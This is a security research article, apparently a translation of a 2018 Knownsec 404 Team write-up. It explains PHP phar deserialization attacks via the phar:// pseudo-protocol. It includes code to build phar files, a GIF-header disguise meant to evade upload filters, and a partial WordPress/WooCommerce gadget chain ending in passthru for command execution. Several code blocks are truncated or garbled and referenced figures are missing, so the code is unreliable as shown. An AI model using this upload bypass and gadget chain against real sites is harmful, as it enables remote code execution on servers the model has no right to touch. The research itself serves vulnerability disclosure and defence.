**Author: Knownsec 404 Team**  
**Date: August 23, 2018**  
**Chinese Version:**
### 0x01 Introducton
When we usually exploit the deserialization vulnerability, we can only send
the serialized string to `unserialize()`. As the code becomes more and more
secure, it is more and more difficult to exploit. But on the Black Hat 2018,
the security researcher Sam Thomas shared the topic: _It’s a PHP
unserialization vulnerability Jim, but not as we know it_. Since the phar file
stores user-defined meta-data in serialized form, the attack surface of the
PHP deserialization vulnerability has been extended. With the parameter of
filesystem function (`file_exists()`, `is_dir()`, etc.) under control, this
method can be used with `phar://` pseudo-protocol to directly perform
deserialization without relying on `unserialize()`. This makes some functions
that previously seemed "harmless" become "insidious". Let's take a look at
these attacks.
### 0x02 Principles Analysis
#### 2.1 The Phar File Structure
Before we learn about the attacks, we need to firstly look at the file
structure of the phar, and it consists of four parts:
##### 1\. A **Stub**
It can be interpreted as a flag and the format is `xxx`.The front content is not limited, but it must end with
`__HALT_COMPILER();?>`, otherwise the phar extension will not recognize this
file as a phar file.
##### 2\. A **Manifest** Describing the Contents
A phar file is essentially a compressed file, in which the permissions,
attributes and other information of each compressed file are included. This
section also stores user-defined meta-data in serialized form, which is the
core of the above attacks.
##### 3\. The File **Contents**
It’s the contents of the compressed file.
##### 4\. [optional] a **signature** for verifying Phar integrity (phar file
format only)
The format is as follows:
#### 2.2 Demo
Construct a phar file according to the file structure, and PHP has a built-in
phar class to handle related operations.
PS: Set the `phar.readonly` option in `php.ini` to `Off`, otherwise the phar
file cannot be generated.
`phar_gen.php`
    startBuffering();
        $phar->setStub(""); //设置stub
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
It can be clearly seen that meta-data is stored in serialized form:
Since there is serialization data, there must be deserialization operation.
Most filesystem functions in PHP will deserialize meta-data when parsing phar
files through `phar://` pseudo-protocol. The affected functions after the test
are as follows:
Here's how the underlying PHP code works:
`php-src/ext/phar/phar.c`
Verify via the demo:
`phar_test1.php`
Other functions are certainly feasible:
`phar_test2.php`
When the parameters of filesystem function are controllable, we can
deserialize it without calling `unserialize()`, and some functions that
previously seemed "harmless" become "insidious," greatly expanding the attack
surface.
#### 2.3 Forge phar into files in other formats
In the previous analysis of phar's file structure, you may have noticed that
PHP identifies phar file through the stub of its file header, or more
specifically it’s by `__HALT_COMPILER();?>`, and the previous content or
suffix name is not restrained. We can then forge the phar file into other
formats by adding arbitrary file headers and modifying the suffix name.
    startBuffering();
        $phar->setStub("GIF89a".""); //设置stub，增加gif文件头
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
This method can bypass a large part of the upload detection.
### 0x03 Exploitation
#### 3.1 Exploitation Conditions
  1. Phar files should be able to be uploaded to the server.
  2. There is a magic trick available as a "springboard".
  3. The parameters of file operation function are controllable, and some special characters such as `:`、`/`、`phar` are not filtered.
#### 3.2 Wordpress
Wordpress is the most widely-used cms on the Internet. This vulnerability was
reported to the official in February 2017, but it has not been fixed yet. The
previous arbitrary file deletion vulnerabilities also appeared in this part of
the code, and there was no fix. According to the exploitation conditions, we
must first construct a phar file.
Find out the class methods that can execute arbitrary code:
`wp-includes/Requests/Utility/FilteredIterator.php`
    class Requests_Utility_FilteredIterator extends ArrayIterator {
        /**
        * Callback to run as a filter
        *
        * @var callable
        */
        protected $callback;
        ...
        public function current() {
            $value = parent::current();
            $value = call_user_func($this->callback, $value);
            return $value;
        }
    }
This class inherits `ArrayIterator`, and the `current()` method is called
every time the object instantiated by this class enters `foreach` to be
traversed. Next we need to find a destructor that uses `foreach` internally.
Unfortunately, there are no proper classes in the core code of wordpress, so
we have to start with plugins.Here is a class that can be exploited in the
**WooCommerce** plugin:
`wp-content/plugins/woocommerce/includes/log-handlers/class-wc-log-handler-file.php`
    class WC_Log_Handler_File extends WC_Log_Handler {
        protected $handles = array();
        /*......*/
        public function __destruct() {
            foreach ( $this->handles as $handle ) {
                if ( is_resource( $handle ) ) {
                    fclose( $handle ); // @codingStandardsIgnoreLine.
                }
            }
        }
        /*......*/
    }
Here we have finished constructing the pop chain, and we construct the phar
file accordingly:
    callback = $callback;
            }
        }
        class WC_Log_Handler_File {
            protected $handles;
            public function __construct() {
                $this->handles = new Requests_Utility_FilteredIterator(array('id'), 'passthru');